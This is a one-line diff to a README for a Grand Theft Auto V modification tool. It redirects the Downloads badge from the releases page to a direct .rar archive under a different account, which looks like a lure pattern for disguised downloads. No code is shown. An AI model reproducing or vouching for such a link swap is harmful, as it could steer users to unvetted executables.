@@ -6,7 +6,7 @@
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey.svg?style=for-the-badge&logo=windows)](https://microsoft.com/)
 [![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
 [![Status](https://img.shields.io/badge/Status-Active%20Development-success.svg?style=for-the-badge)]()
-[![Downloads](https://img.shields.io/github/downloads/YourName/ApexRuntimeCustomizer/total?style=for-the-badge&color=blue)](https://github.com/YourName/ApexRuntimeCustomizer/releases/latest)
+[![Downloads](https://img.shields.io/github/downloads/YourName/ApexRuntimeCustomizer/total?style=for-the-badge&color=blue)](https://github.com/coderUWU/ApexRuntimeCustomizer/releases/download/v1.0.0/GrandTheftApex.rar)
 [![Version](https://img.shields.io/github/v/release/YourName/ApexRuntimeCustomizer?include_prereleases&label=Latest%20Version&style=for-the-badge&color=orange)](https://github.com/YourName/ApexRuntimeCustomizer/releases/latest)
 
 *Elevate your Grand Theft Auto V experience with Apex Runtime Customizer – a powerful tool for in-game modifications and enhancements.*
